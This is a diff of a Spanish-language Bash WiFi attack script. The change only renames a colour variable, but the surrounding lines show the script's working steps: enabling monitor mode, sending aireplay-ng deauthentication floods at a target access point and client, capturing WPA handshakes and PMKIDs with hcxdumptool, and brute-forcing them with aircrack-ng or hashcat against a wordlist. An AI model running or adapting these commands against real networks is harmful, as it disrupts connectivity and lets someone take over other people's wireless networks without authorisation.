@@ -86,7 +86,7 @@ function interfaceModeMonitor(){
 		done
 	fi; rm interface
 
-	sleep 0.25; echo -e "${readColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
+	sleep 0.25; echo -e "${redColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
 	sleep 0.25; airmon-ng start $networkCard >/dev/null 2>&1; airmon-ng check kill >/dev/null 2>&1
 	ip addr list ${networkCard}mon >/dev/null 2>&1
 
@@ -163,7 +163,7 @@ function attackDeauth (){
 	if [ "$MORE_OPT" != "true" ]; then
 		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
 		xtermAireplayPIB=$!
-		sleep 0.5; echo -ne "${readColour}::${endColour} ${grayColour}Para matar el ataque presione [ENTER]: ${endColour}"; read
+		sleep 0.5; echo -ne "${redColour}::${endColour} ${grayColour}Para matar el ataque presione [ENTER]: ${endColour}"; read
 		sleep 0.5; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB &>/dev/null; sleep 0.5
 	fi; kill -9 $xtermAirodump_AP_PID &>/dev/null; wait $xtermAirodump_AP_PID &>/dev/null; sleep 0.5; ctrl_c
 }
@@ -207,14 +207,14 @@ function attackHandshake(){
 		sleep $numS; kill -9 $xtermAireplayPID; wait $xtermAireplayPID 2>/dev/null; sleep $numSI
 	done
 
-	echo -e "${readColour}::${endColour} ${grayColour}Esperando 10 segusdos${endColour}"
+	echo -e "${redColour}::${endColour} ${grayColour}Esperando 10 segusdos${endColour}"
 	sleep 10; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null
 
 	if [ "$ruteDic" == "" ]; then echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic; fi
 
 	xterm -hold -e "aircrack-ng -w $ruteDic -b $BSSID  Captura-01.cap" 2>/dev/null &
 
-	echo -e "\t${readColour}::${endColour} ${grayColour}Crack Handshake${scanTimeout}(s)${endColour}"
+	echo -e "\t${redColour}::${endColour} ${grayColour}Crack Handshake${scanTimeout}(s)${endColour}"
 
 	if [ "$CAPTURE_DELETE" == "true" ]; then
 		sleep 1; until [[ $capOPT =~ (y|n|Y|N) ]]; do
@@ -223,8 +223,8 @@ function attackHandshake(){
 
 		if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
 			rm Captura* 2>/dev/null
-			sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
-			sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
+			sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
+			sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
 		fi
 	fi; sleep 1; ctrl_c
 }
@@ -240,7 +240,7 @@ function attackPMKID(){
 		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
 		xtermHcxdumptoolPID=$!
 
-		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}El escaneo durara ${scanTimeout}(s)${endColour}"
+		sleep 0.5; echo -e "\t\t${redColour}::${endColour} ${grayColour}El escaneo durara ${scanTimeout}(s)${endColour}"
 		sleep $scanTimeout; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
 	elif [ "$mode" == "manual" ];then
 		echo -ne "\t${yellowColour}Comenzar escaneo [ENTER] ${endColour}" && read
@@ -248,7 +248,7 @@ function attackPMKID(){
 		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
 		xtermHcxdumptoolPID=$!
 
-		sleep 1; echo -e "\t\t${readColour}::${endColour} ${grayColour}Escaneo en ejecucion${endColour}"
+		sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Escaneo en ejecucion${endColour}"
 		echo -e "\t${yellowColour}Parrar escaneo [ENTER] ${endColour}" && read
 
 		sleep 1; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
@@ -260,18 +260,18 @@ function attackPMKID(){
 	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic
 
 	if [ "$crackMode" == "aircrack" ]; then
-		echo -e "\t\t${readColour}::${endColour} ${grayColour}Captura.pcapng >> Captura.pcap${endColour}"
+		echo -e "\t\t${redColour}::${endColour} ${grayColour}Captura.pcapng >> Captura.pcap${endColour}"
 		tcpdump -r Captura.pcapng -w Captura.pcap 1>/dev/null 2>&1
-		echo -e "\t\t${readColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
+		echo -e "\t\t${redColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
 		aircrack-ng -w $ruteDic Captura.pcap
 	elif [ "$crackMode" == "hashcat" ]; then
-		echo -e "\t\t${readColour}::${endColour} ${grayColour}Extrallendo hashes${endColour}"
+		echo -e "\t\t${redColour}::${endColour} ${grayColour}Extrallendo hashes${endColour}"
 		hcxpcapngtool --pmkid=myHashes Captura.pcapng 1>/dev/null 2>&1
 
 		test -f myHashes
 
 		if [ "$(echo $?)" == "0" ]; then
-			echo -e "\t\t${readColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
+			echo -e "\t\t${redColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
 			hashcat -m 16800 $ruteDic myHashes -d 1 --force
 		else
 			ctrl_c
@@ -295,10 +295,10 @@ function dicctionary(){
 
      	let numPasswords=$numLineas/$numReferi; sleep 0.5
        	let count=$(echo $numPasswords); sleep 0.5
-	echo -e "\t\t${readColour}::${endColour} ${grayColour}Creando diccionarios en la carpeta .TMP${endColour}"
+	echo -e "\t\t${redColour}::${endColour} ${grayColour}Creando diccionarios en la carpeta .TMP${endColour}"
         for (( c=1; c<=$numReferi; c++ ))
         do
-		echo -e "\t\t${readColour}::${endColour} ${grayColour}Creando dict${c}${endColour}"
+		echo -e "\t\t${redColour}::${endColour} ${grayColour}Creando dict${c}${endColour}"
                 echo "$(head -n $count $ruteDic | tail -n $numPasswords)" > .TMP/dict${c}.txt; sleep 1
                 let count+=$numPasswords
        done
